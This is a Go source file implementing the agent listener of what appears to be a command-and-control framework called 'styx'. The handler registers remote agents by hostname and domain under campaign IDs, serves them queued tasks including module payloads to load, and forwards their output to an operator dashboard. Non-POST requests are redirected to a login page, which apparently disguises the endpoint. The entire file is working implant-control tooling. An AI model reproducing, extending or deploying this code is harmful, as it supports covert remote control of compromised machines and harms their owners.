package agentsrv

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"styx/internal/db"
	"styx/internal/modules"
	"styx/internal/packager"
	"styx/internal/ws"
)

type Agent struct {
	db      *db.DB
	modules *modules.Registry
	Ws      *ws.WS
}

func New(db *db.DB, modules *modules.Registry, w *ws.WS) *Agent {
	return &Agent{db: db, modules: modules, Ws: w}
}

// NewAgent is the payload broadcast to dashboard tabs when an agent registers.
type NewAgent struct {
	CampaignID string `json:"campaign_id"`
	Name       string `json:"name"`
	ClientID   int32  `json:"client_id"`
	Hostname   string `json:"hostname"`
	Domain     string `json:"domain"`
	CreatedAt  string `json:"created_at"`
}

/*
 * Campaign ID is inusiated via the requested path
   [MetaData] [
   		[Start Magic val] 4 Bytes
     	[Client ID]       4 Bytes
   ]
   [Message Type]         4 Bytes
   [per message data]
   ...
   [End Magic val]        4 Bytes

   case MSG_GET_TASK -> no extra data
   ---
   case MSG_OUTPUT [
   		[Output Type] 4 Bytes -> OUTPUT_RAW, OUTPUT_NEEDS_PARSE(followed by parse ID), OUTPUT_SUCCESS(followed by success code), OUTPUT_FAILURE(followed by error code)
   ---
   case MSG_REGISTER 4 Bytes

   ]
*/

func (agent *Agent) HandleAgentSrv(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Redirect(w, r, "/login", http.StatusPermanentRedirect)
		return
	}

	campaignID, err := agent.db.GetCampaignIdFromPath(r.URL.Path)
	if campaignID == "" || err != nil {
		http.NotFound(w, r)
		return
	}
	defer r.Body.Close()
	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "error", http.StatusInternalServerError)
		return
	}
	if len(body) < 12 {
		http.NotFound(w, r)
		return
	}
	reader := bytes.NewReader(body)

	MessageID, AgentID, err := packager.ParseIncomingMetaDataAndValidate(reader)
	if err != nil {
		fmt.Println("[!] MetaData Failed to parse or validate")
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	fmt.Println("[+] Agent POSTed")
	switch MessageID {
	case MSG_REGISTER:
		AgentInfo, err := packager.ParseRegister(reader)
		if err != nil {
			fmt.Println("[!] Failed Parsing register")
			http.Error(w, "failed parsing", http.StatusInternalServerError)
			return
		}

		client, err := agent.db.InsertAgent(AgentInfo, campaignID)
		if err != nil {
			fmt.Println("[!] Failed Inserting")
			http.Error(w, "failed parsing", http.StatusInternalServerError)
			return
		}

		err = agent.Ws.SendWsMessage(NewAgent{
			CampaignID: campaignID,
			Name:       client.Name,
			ClientID:   client.ID,
			Hostname:   client.Hostname,
			Domain:     client.Domain,
			CreatedAt:  client.CreatedAt,
		}, ws.NewAgent)
		if err != nil {
			fmt.Println("[!] Failed sending new agent event:", err)
		}
		w.WriteHeader(http.StatusOK)
	case MSG_GET_TASK:
		tasks, err := agent.db.GetTasks(AgentID)
		if err != nil {
			fmt.Println("[!] Failed Getting tasks")
			http.Error(w, "failed parsing", http.StatusInternalServerError)
			return
		}
		for index := range tasks {
			if tasks[index].Kind == "load-module" {
				tasks[index].ModuleData = agent.modules.ModuleData(tasks[index].Module)
			}
		}
		w.WriteHeader(http.StatusOK)
		w.Write(packager.PackTasks(tasks))
		return

	case MSG_OUTPUT:
		data, err := packager.ParseAgentOutput(reader, AgentID)
		if err != nil {
			agent.Ws.SendWsMessage(ErrorMsg{Msg: "[!] Server Failed too Parse output"}, ws.ErrorMsg)
			w.WriteHeader(http.StatusOK)
			return
		}
		agent.Ws.SendWsMessage(data, ws.TaskOutput)
		w.WriteHeader(http.StatusOK)
		return
	}

}
